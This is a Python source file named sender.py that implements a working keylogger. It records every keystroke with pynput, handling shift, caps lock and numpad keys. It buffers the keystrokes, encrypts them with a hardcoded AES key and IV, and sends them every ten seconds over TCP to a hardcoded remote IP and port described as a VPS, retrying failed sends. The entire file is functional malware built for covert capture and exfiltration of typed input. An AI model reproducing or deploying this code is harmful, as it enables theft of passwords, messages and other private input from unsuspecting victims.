# sender.py

from pynput import keyboard
from pynput.keyboard import Key
import socket
import signal
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import threading
import queue
import time

# Encryption setup
SECRET_KEY = b'w\xd7\xc9=0\x17\xd1{\xe3\xc7{\x1a"\x8d\xa7\xb19\x87e\xb7gTQ\x98R\xed\xf2\x90\xbc\xfb2\xd2'
IV = b'\xed>\x86\x98\xed\xe5%\x99\x91\xe9r\x8b\t\xe3\xf2\xd2'

# VPS connection
HOST = '107.189.21.156'  # <<< PUT YOUR VPS PUBLIC IP HERE
PORT = 43558

# Timing
#WRITE_INTERVAL = 5 * 60  # 5 minutes
WRITE_INTERVAL = 10

# Thread communication
key_queue = queue.Queue()
send_queue = queue.Queue()
stop_event = threading.Event()

# State tracking
shift_active = False
caps_lock = False

# Numpad mapping
numpad_map = {
    96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
    101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
    110: '.', 107: '+', 109: '-', 106: '*', 111: '/'
}

def encrypt_data(data):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
    padded_data = pad(data.encode(), AES.block_size)
    encrypted_data = cipher.encrypt(padded_data)
    return base64.b64encode(encrypted_data)

def send_data(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.sendall(encrypt_data(data))
        print("[+] Buffer sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send buffer: {e}")
        return False
    return True

def periodic_sender():
    buffer = []
    last_flush_time = time.time()

    while not stop_event.is_set():
        try:
            # Collect incoming keys from key queue
            try:
                while True:
                    key = key_queue.get_nowait()
                    buffer.append(key)
            except queue.Empty:
                pass

            current_time = time.time()
            if current_time - last_flush_time >= WRITE_INTERVAL:
                if buffer:
                    data = ''.join(buffer)
                    success = send_data(data)
                    if not success:
                        send_queue.put(data)  # Save unsent data for retry
                    buffer.clear()
                    last_flush_time = current_time

            # Retry previous unsent data
            try:
                while True:
                    unsent_data = send_queue.get_nowait()
                    success = send_data(unsent_data)
                    if not success:
                        send_queue.put(unsent_data)  # Put it back if still failed
                        break  # Avoid tight retry loops
            except queue.Empty:
                pass

            time.sleep(1)

        except Exception as e:
            print(f"[!] Unexpected error in sender thread: {e}")

def get_char(key):
    global shift_active, caps_lock

    if key == Key.caps_lock:
        caps_lock = not caps_lock
        return ''
    elif key == Key.shift or key == Key.shift_r:
        shift_active = True
        return ''
    elif key == Key.esc:
        return '<ESC>'

    uppercase = (shift_active ^ caps_lock)

    try:
        if hasattr(key, 'vk') and key.vk in numpad_map:
            return numpad_map[key.vk]

        if hasattr(key, 'char') and key.char:
            if uppercase and key.char.isalpha():
                return key.char.upper()
            return key.char

    except AttributeError:
        pass

    special_map = {
        Key.space: ' ',
        Key.enter: '\n',
        Key.tab: '\t',
        Key.backspace: '\b',
        Key.delete: '<DEL>',
        Key.right: '<RIGHT>',
        Key.left: '<LEFT>'
    }
    return special_map.get(key, '')

def on_press(key):
    char = get_char(key)
    if char:
        key_queue.put(char)

def on_release(key):
    global shift_active
    if key == Key.shift or key == Key.shift_r:
        shift_active = False

def shutdown(signum=None, frame=None):
    print("\n[!] Shutting down sender...")
    stop_event.set()
    sys.exit(0)

if __name__ == '__main__':
    signal.signal(signal.SIGINT, shutdown)
    threading.Thread(target=periodic_sender, daemon=True).start()

    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release,
            suppress=False) as listener:
        listener.join()
